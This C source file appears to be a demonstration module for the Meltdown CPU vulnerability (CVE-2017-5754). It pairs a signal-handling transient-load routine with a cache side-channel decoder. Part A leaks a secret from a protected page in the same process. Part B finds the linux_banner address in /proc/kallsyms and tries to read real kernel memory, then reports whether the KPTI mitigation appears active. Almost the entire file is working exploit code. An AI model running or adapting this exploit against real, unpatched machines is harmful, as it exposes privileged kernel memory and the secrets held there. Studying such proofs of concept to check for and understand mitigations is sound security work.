#define _POSIX_C_SOURCE 200112L
#include "meltdown.h"
#include "cache.h"
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <signal.h>
#include <setjmp.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <x86intrin.h>

/* -----------------------------------------------------------------------
   Signal handling
   -----------------------------------------------------------------------
   Key subtlety: signal() leaves SIGSEGV blocked in the signal mask after
   the handler runs.  On the second iteration, the fault raises SIGSEGV
   but it's masked → the kernel delivers it as a forced kill (SIGKILL).
   Fix: use sigaction() with an empty sa_mask, and reinstall from *inside*
   the handler so the mask is always clear before siglongjmp. */

static sigjmp_buf meltdown_jmpbuf;
static volatile int fault_count = 0;

static void install_segv_handler(void);   /* forward declaration */

static void segfault_handler(int sig) {
    (void)sig;
    fault_count++;
    install_segv_handler();   /* reinstall: resets the signal mask */
    siglongjmp(meltdown_jmpbuf, 1);
}

static void install_segv_handler(void) {
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = segfault_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = 0;   /* no SA_RESTART — we want siglongjmp to take over */
    sigaction(SIGSEGV, &sa, NULL);
}

/* -----------------------------------------------------------------------
   Attempt to read one byte from 'addr' via the Meltdown timing channel */
static int meltdown_read_byte(volatile uint8_t *addr) {
    flush_probe_array();
    _mm_mfence();

    if (sigsetjmp(meltdown_jmpbuf, 1) == 0) {
        /*
         * MELTDOWN WINDOW
         * ---------------
         * The CPU's out-of-order engine issues this load and the
         * permission check in parallel.  On unpatched Intel hardware:
         *
         *   1. Fetch:     the byte value arrives in a register.
         *   2. OOO exec:  probe_array[byte * CACHE_STRIDE] is loaded.
         *   3. Permission check finishes → #PF raised.
         *   4. Retire:    CPU rewinds registers.  Cache line stays warm.
         *
         * On patched kernels (KPTI / mprotect simulation): the address
         * has no mapping in the page table so the TLB walk faults before
         * any data escapes the pipeline.  The probe array stays cold and
         * find_cached_slot() returns noise (near-zero value).
         */
        uint8_t secret_byte = *addr;                          /* illegal load */
        probe_array[secret_byte * CACHE_STRIDE] += 1;         /* encode in cache */
    }
    /* siglongjmp delivers us here on fault. */

    return find_cached_slot(NULL);
}

/* -----------------------------------------------------------------------
   Part A: mprotect simulation
   ----------------------------------------------------------------------- */
static int meltdown_demo_inprocess(void) {
    long page_sz = sysconf(_SC_PAGESIZE);
    uint8_t *secret_page = mmap(NULL, (size_t)page_sz,
                                PROT_READ | PROT_WRITE,
                                MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (secret_page == MAP_FAILED) { perror("mmap"); return -1; }

    const char *secret = "MELTDOWN_KEY_42!";
    memcpy(secret_page, secret, strlen(secret) + 1);

    /* Make the page unreadable — simulates kernel/user privilege boundary. */
    mprotect(secret_page, (size_t)page_sz, PROT_NONE);

    printf("  Protected page  : %p  (PROT_NONE)\n", (void *)secret_page);
    printf("  Secret          : [hidden]\n");
    printf("  Attempting Meltdown-style read...\n\n");
    printf("  Byte#  Leaked   ASCII  Expected\n");
    printf("  ─────  ──────   ─────  ────────\n");

    fault_count = 0;
    install_segv_handler();

    size_t secret_len = strlen(secret);
    int correct = 0;

    for (size_t i = 0; i < secret_len; i++) {
        int votes[256] = {0};
        for (int t = 0; t < 100; t++) {
            int v = meltdown_read_byte(secret_page + i);
            if (v >= 0 && v < 256) votes[v]++;
        }
        int best = 0;
        for (int v = 1; v < 256; v++)
            if (votes[v] > votes[best]) best = v;

        uint8_t expected = (uint8_t)secret[i];
        char match = ((uint8_t)best == expected) ? '*' : ' ';
        if ((uint8_t)best == expected) correct++;

        printf("  [%2zu]   0x%02X     '%c'    0x%02X '%c'  %c\n",
               i,
               best,     (best     >= 32 && best     < 127) ? (char)best     : '?',
               expected, (expected >= 32 && expected < 127) ? (char)expected : '?',
               match);
    }

    mprotect(secret_page, (size_t)page_sz, PROT_READ | PROT_WRITE);
    munmap(secret_page, (size_t)page_sz);

    /* Restore default signal handling */
    signal(SIGSEGV, SIG_DFL);

    printf("\n  Faults caught   : %d\n", fault_count);
    printf("  Result: %d/%zu bytes correct (%.0f%%)\n",
           correct, secret_len, 100.0 * correct / secret_len);

    if (correct == (int)secret_len)
        printf("  [PASS] Full secret read via cache side-channel.\n");
    else if (correct > 0)
        printf("  [PARTIAL] Some bytes leaked; CPU may partially mitigate.\n");
    else
        printf("  [BLOCKED] Side-channel produced only noise.\n");

    return 0;
}

/* -----------------------------------------------------------------------
   Part B: real kernel address probe
   ----------------------------------------------------------------------- */
static void meltdown_kernel_probe(void) {
    FILE *f = fopen("/proc/kallsyms", "r");
    unsigned long kernel_addr = 0;

    if (f) {
        char line[256], name[128], type;
        while (fgets(line, sizeof(line), f)) {
            if (sscanf(line, "%lx %c %127s", &kernel_addr, &type, name) == 3
                && strcmp(name, "linux_banner") == 0) break;
            kernel_addr = 0;
        }
        fclose(f);
    }

    if (!kernel_addr) {
        printf("  Kernel symbol lookup not available (need root).\n");
        printf("  Skipping kernel-address probe.\n");
        return;
    }

    printf("  linux_banner @ 0x%lx\n", kernel_addr);
    printf("  Attempting direct kernel read...\n");

    fault_count = 0;
    install_segv_handler();

    uint8_t buf[32] = {0};
    for (int i = 0; i < 32; i++) {
        int votes[256] = {0};
        for (int t = 0; t < 50; t++) {
            int v = meltdown_read_byte((volatile uint8_t *)(kernel_addr + (size_t)i));
            if (v >= 0 && v < 256) votes[v]++;
        }
        int best = 0;
        for (int v = 1; v < 256; v++)
            if (votes[v] > votes[best]) best = v;
        buf[i] = (uint8_t)best;
    }
    signal(SIGSEGV, SIG_DFL);

    int printable = 0;
    for (int i = 0; i < 32; i++)
        if (buf[i] >= 32 && buf[i] < 127) printable++;

    printf("  Raw:   ");
    for (int i = 0; i < 32; i++) printf("%02x ", buf[i]);
    printf("\n");
    printf("  ASCII: ");
    for (int i = 0; i < 32; i++)
        putchar((buf[i] >= 32 && buf[i] < 127) ? buf[i] : '.');
    printf("\n");
    printf("  Faults: %d\n", fault_count);

    if (printable > 12)
        printf("  [WARN] Printable data found — KPTI may not be active!\n");
    else
        printf("  [OK]   Only noise — KPTI blocks the kernel read.\n");
}

/* -----------------------------------------------------------------------
   Public entry point */
int meltdown_demo(void) {
    printf("\n");
    printf("╔══════════════════════════════════════════╗\n");
    printf("║              MELTDOWN                    ║\n");
    printf("║   Rogue Data Cache Load (CVE-2017-5754)  ║\n");
    printf("╚══════════════════════════════════════════╝\n\n");

    FILE *kpti = fopen("/sys/devices/system/cpu/vulnerabilities/meltdown", "r");
    if (kpti) {
        char status[128] = {0};
        if (fgets(status, sizeof(status), kpti))
            status[strcspn(status, "\n")] = 0;
        printf("  Kernel KPTI status: %s\n\n", status);
        fclose(kpti);
    }

    printf("  ── Part A: mprotect privilege simulation ──\n\n");
    meltdown_demo_inprocess();

    printf("\n  ── Part B: real kernel address probe ──\n\n");
    meltdown_kernel_probe();

    return 0;
}
